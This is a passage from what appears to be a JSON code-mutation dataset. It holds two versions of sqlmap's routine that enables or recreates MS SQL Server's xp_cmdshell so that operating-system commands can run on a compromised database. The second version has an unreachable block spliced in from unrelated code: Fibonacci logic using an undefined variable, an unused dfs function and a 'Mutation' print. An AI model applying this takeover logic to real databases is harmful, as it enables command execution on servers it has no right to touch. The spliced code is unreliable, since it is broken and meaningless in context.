logger.info('xp_cmdshell created successfully')\n                        kb.xpCmdshellAvailable = True\n                    else:\n                        warnMsg = 'xp_cmdshell creation failed, probably '\n                        warnMsg += 'because sp_OACreate is disabled'\n                        logger.warning(warnMsg)\n        hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)\n        if not kb.xpCmdshellAvailable:\n            errMsg = 'unable to proceed without xp_cmdshell'\n            raise SqlmapUnsupportedFeatureException(errMsg)\n    debugMsg = 'creating a support table to write commands standard '\n    debugMsg += 'output to'\n    logger.debug(debugMsg)\n    self.createSupportTbl(self.cmdTblName, self.tblField, 'NVARCHAR(4000)')\n    self._xpCmdshellTest()",
            "def xpCmdshellInit(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if not kb.xpCmdshellAvailable:\n        infoMsg = 'checking if xp_cmdshell extended procedure is '\n        infoMsg += 'available, please wait..'\n        logger.info(infoMsg)\n        result = self._xpCmdshellCheck()\n        if result:\n            logger.info('xp_cmdshell extended procedure is available')\n            kb.xpCmdshellAvailable = True\n        else:\n            message = 'xp_cmdshell extended procedure does not seem to '\n            message += 'be available. Do you want sqlmap to try to '\n            message += 're-enable it? [Y/n] '\n            if readInput(message, default='Y', boolean=True):\n                self._xpCmdshellConfigure(1)\n                if self._xpCmdshellCheck():\n                    logger.info('xp_cmdshell re-enabled successfully')\n                    kb.xpCmdshellAvailable = True\n                else:\n                    logger.warning('xp_cmdshell re-enabling failed')\n                    logger.info('creating xp_cmdshell with sp_OACreate')\n                    self._xpCmdshellConfigure(0)\n                    self._xpCmdshellCreate()\n                    if self._xpCmdshellCheck():\n                        logger.info('xp_cmdshell created successfully')\n                        kb.xpCmdshellAvailable = True\n                    else:\n                        warnMsg = 'xp_cmdshell creation failed, probably '\n                        warnMsg += 'because sp_OACreate is disabled'\n                        logger.warning(warnMsg)\n        hashDBWrite(HASHDB_KEYS.KB_XP_CMDSHELL_AVAILABLE, kb.xpCmdshellAvailable)\n        if not kb.xpCmdshellAvailable:\n            errMsg = 'unable to proceed without xp_cmdshell'\n            raise SqlmapUnsupportedFeatureException(errMsg)\n    debugMsg = 'creating a support table to write commands standard '\n    debugMsg += 'output to'\n    logger.debug(debugMsg)\n    self.createSupportTbl(self.cmdTblName, self.tblField, 'NVARCHAR(4000)')\n    self._xpCmdshellTest()"
        ]
    }
]